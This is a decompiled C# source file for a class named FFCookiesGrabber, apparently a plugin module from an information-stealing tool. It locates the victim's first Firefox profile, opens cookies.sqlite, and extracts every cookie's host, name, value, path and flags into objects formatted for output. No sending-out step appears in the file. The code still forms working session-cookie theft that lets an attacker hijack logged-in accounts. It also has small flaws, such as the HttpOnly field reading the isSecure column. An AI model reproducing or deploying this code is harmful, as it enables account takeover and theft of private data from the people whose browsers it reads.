using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Browsers.Firefox.Cookies
{
	// Token: 0x02000013 RID: 19
	public class FFCookiesGrabber
	{
		// Token: 0x06000086 RID: 134 RVA: 0x00006114 File Offset: 0x00004314
		private static void Init_Path()
		{
			FFCookiesGrabber.firefoxProfilePath = FFCookiesGrabber.GetProfilePath();
			bool flag = FFCookiesGrabber.firefoxProfilePath == null;
			if (flag)
			{
				throw new NullReferenceException("Firefox does not have any profiles, has it ever been launched?");
			}
			FFCookiesGrabber.firefoxCookieFile = FFCookiesGrabber.GetFile(FFCookiesGrabber.firefoxProfilePath, "cookies.sqlite");
			bool flag2 = FFCookiesGrabber.firefoxCookieFile == null;
			if (flag2)
			{
				throw new NullReferenceException("Firefox does not have any cookie file");
			}
		}

		// Token: 0x06000087 RID: 135 RVA: 0x00006170 File Offset: 0x00004370
		public static List<FFCookiesGrabber.FirefoxCookie> Cookies()
		{
			FFCookiesGrabber.Init_Path();
			List<FFCookiesGrabber.FirefoxCookie> data = new List<FFCookiesGrabber.FirefoxCookie>();
			SQLiteHandler sql = new SQLiteHandler(FFCookiesGrabber.firefoxCookieFile.FullName);
			bool flag = !sql.ReadTable("moz_cookies");
			if (flag)
			{
				throw new Exception("Could not read cookie table");
			}
			int totalEntries = sql.GetRowCount();
			for (int i = 0; i < totalEntries; i++)
			{
				try
				{
					string h = sql.GetValue(i, "host");
					string name = sql.GetValue(i, "name");
					string val = sql.GetValue(i, "value");
					string path = sql.GetValue(i, "path");
					bool secure = !(sql.GetValue(i, "isSecure") == "0");
					bool http = !(sql.GetValue(i, "isSecure") == "0");
					long expiryTime = long.Parse(sql.GetValue(i, "expiry"));
					long currentTime = FFCookiesGrabber.ToUnixTime(DateTime.Now);
					DateTime exp = FFCookiesGrabber.FromUnixTime(expiryTime);
					bool expired = currentTime > expiryTime;
					data.Add(new FFCookiesGrabber.FirefoxCookie
					{
						Host = h,
						ExpiresUTC = exp,
						Expired = expired,
						Name = name,
						Value = val,
						Path = path,
						Secure = secure,
						HttpOnly = http
					});
				}
				catch (Exception)
				{
					return data;
				}
			}
			return data;
		}

		// Token: 0x06000088 RID: 136 RVA: 0x0000630C File Offset: 0x0000450C
		private static DateTime FromUnixTime(long unixTime)
		{
			DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
			return epoch.AddSeconds((double)unixTime);
		}

		// Token: 0x06000089 RID: 137 RVA: 0x0000633C File Offset: 0x0000453C
		private static long ToUnixTime(DateTime value)
		{
			return (long)(value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime()).TotalSeconds;
		}

		// Token: 0x0600008A RID: 138 RVA: 0x00006378 File Offset: 0x00004578
		private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
		{
			FileInfo[] files = profilePath.GetFiles(searchTerm);
			int num = 0;
			if (num >= files.Length)
			{
				throw new Exception("No Firefox logins.json was found");
			}
			return files[num];
		}

		// Token: 0x0600008B RID: 139 RVA: 0x000063B0 File Offset: 0x000045B0
		private static DirectoryInfo GetProfilePath()
		{
			string raw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
			bool flag = !Directory.Exists(raw);
			if (flag)
			{
				throw new Exception("Firefox Application Data folder does not exist!");
			}
			DirectoryInfo profileDir = new DirectoryInfo(raw);
			DirectoryInfo[] profiles = profileDir.GetDirectories();
			bool flag2 = profiles.Length == 0;
			if (flag2)
			{
				throw new IndexOutOfRangeException("No Firefox profiles could be found");
			}
			return profiles[0];
		}

		// Token: 0x04000032 RID: 50
		private static DirectoryInfo firefoxProfilePath;

		// Token: 0x04000033 RID: 51
		private static FileInfo firefoxCookieFile;

		// Token: 0x02000022 RID: 34
		public class FirefoxCookie
		{
			// Token: 0x17000027 RID: 39
			// (get) Token: 0x060000D4 RID: 212 RVA: 0x000070F8 File Offset: 0x000052F8
			// (set) Token: 0x060000D5 RID: 213 RVA: 0x00007100 File Offset: 0x00005300
			public string Host { get; set; }

			// Token: 0x17000028 RID: 40
			// (get) Token: 0x060000D6 RID: 214 RVA: 0x00007109 File Offset: 0x00005309
			// (set) Token: 0x060000D7 RID: 215 RVA: 0x00007111 File Offset: 0x00005311
			public string Name { get; set; }

			// Token: 0x17000029 RID: 41
			// (get) Token: 0x060000D8 RID: 216 RVA: 0x0000711A File Offset: 0x0000531A
			// (set) Token: 0x060000D9 RID: 217 RVA: 0x00007122 File Offset: 0x00005322
			public string Value { get; set; }

			// Token: 0x1700002A RID: 42
			// (get) Token: 0x060000DA RID: 218 RVA: 0x0000712B File Offset: 0x0000532B
			// (set) Token: 0x060000DB RID: 219 RVA: 0x00007133 File Offset: 0x00005333
			public string Path { get; set; }

			// Token: 0x1700002B RID: 43
			// (get) Token: 0x060000DC RID: 220 RVA: 0x0000713C File Offset: 0x0000533C
			// (set) Token: 0x060000DD RID: 221 RVA: 0x00007144 File Offset: 0x00005344
			public DateTime ExpiresUTC { get; set; }

			// Token: 0x1700002C RID: 44
			// (get) Token: 0x060000DE RID: 222 RVA: 0x0000714D File Offset: 0x0000534D
			// (set) Token: 0x060000DF RID: 223 RVA: 0x00007155 File Offset: 0x00005355
			public bool Secure { get; set; }

			// Token: 0x1700002D RID: 45
			// (get) Token: 0x060000E0 RID: 224 RVA: 0x0000715E File Offset: 0x0000535E
			// (set) Token: 0x060000E1 RID: 225 RVA: 0x00007166 File Offset: 0x00005366
			public bool HttpOnly { get; set; }

			// Token: 0x1700002E RID: 46
			// (get) Token: 0x060000E2 RID: 226 RVA: 0x0000716F File Offset: 0x0000536F
			// (set) Token: 0x060000E3 RID: 227 RVA: 0x00007177 File Offset: 0x00005377
			public bool Expired { get; set; }

			// Token: 0x060000E4 RID: 228 RVA: 0x00007180 File Offset: 0x00005380
			public override string ToString()
			{
				return string.Format("Host: {1}{0}Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", new object[]
				{
					Environment.NewLine,
					this.Host,
					this.Name,
					this.Value,
					this.Path,
					this.Expired,
					this.HttpOnly,
					this.Secure
				});
			}
		}
	}
}
